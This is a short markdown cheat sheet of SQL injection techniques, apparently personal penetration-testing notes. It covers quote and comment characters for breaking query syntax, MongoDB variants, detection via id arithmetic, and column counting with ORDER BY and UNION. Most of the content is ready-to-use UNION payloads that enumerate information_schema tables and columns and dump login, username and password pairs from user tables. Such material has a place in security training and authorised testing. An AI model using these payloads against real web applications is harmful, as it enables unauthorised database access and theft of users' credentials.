# SQL Injection
To break syntax: \' (Single Quote), " (Double Quote), ` (Back-Tick) <br/>
--(space) or # (Comment out the rest of query) <br/>

### In MongoDB:
" or 1=1 becomes " || 1==1 ( // or <!-- to comment out the end of the query [Can also use Null Byte (%00)])

#### Likely to have SQL Injection
- If you try to access `/article.php?id=2-1`, article 1's information is displayed <br/>
- If you try to access `/article.php?id=2-0`, article 2's information is displayed <br/>
&emsp;&emsp;&emsp;&emsp; `/article.php?id=2 and 1=1` (Should display page content) <br/>
&emsp;&emsp;&emsp;&emsp; `/article.php?id=2 and 1=0` (Should display blank page)

### Exploitation 
(No. of columns returned by first part of query should be equal to second part [i.e. payload])
#### By Union
`/article.php?id=2 union select 1,2` (This will return an error because the no. of column doesnot match) <br/>
`/article.php?id=2 union select 1,2,3` (This will display page as the no. of column is equal) <br/>
* The Query Becomes:- `SELECT id,name,price FROM article WHERE id=2 UNION SELECT 1,2,3` * <br/>
[Any number from 1,2,3 will be reflected back on the page. That is where we query further to see output in page]
#### Order by
`/article.php?id=2 order by 5` (Error as the column on other side is less than 5) <br/>
`/article.php?id=2 order by 3` (Will display page as number of column are equal on both) <br/>
From this we know that the no. of column is 3. So, the final query becomes: `/article.php?id=2 union select 1,2,3` <br/>
````
GET /admin?user=1+AND+1=2+union+select+database(),@@version,1,1 <br/>
admin?user=1 AND 1=2 union select group_concat(table_name),1,1,1 from information_schema.tables where table_schema=database()--  <br/>
/admin?user=1 AND 1=2 union select group_concat(column_name),1,1,1 from information_schema.columns where table_name='user'-- 
````

### Retrieving Information
After query is executed, one or more number from (1,2,3) is reflected back on the web page. So, the reflected number is replaced to further obtain information. <br/>
Functions to obtain information: current_user(), user(), version(). @@version, database()
#### To retrive name of tables and its columns
**List of tables:** `2 union select 1,table_name,3,4 from information_schema.tables` <br/>
**List of Columns:** `2 union select 1,column_name,3,4 from information_schema.columns` <br/>
** *Both can be retrived together by:* ** <br/> 
**- Put table name and column name in different parts of the injection:** <br/>
`2 union select 1,table_name,column_name,4 from information_schema.columns` <br/>
**- Concatenate table name and column name in the same part:** <br/>
`2 union select 1,concat(table_name,':',column_name),3,4 from information_schema.columns` <br/>
Now, the list of table and columns is displayed. Then, <br/>
`2 union select 1,concat(login,':',password),3,4 from users`

### Others:
````
' and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables-- 
' and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='user'-- 
' and 1=2 union select 1,group_concat(id,':',username,':',password),3 from user-- 

````
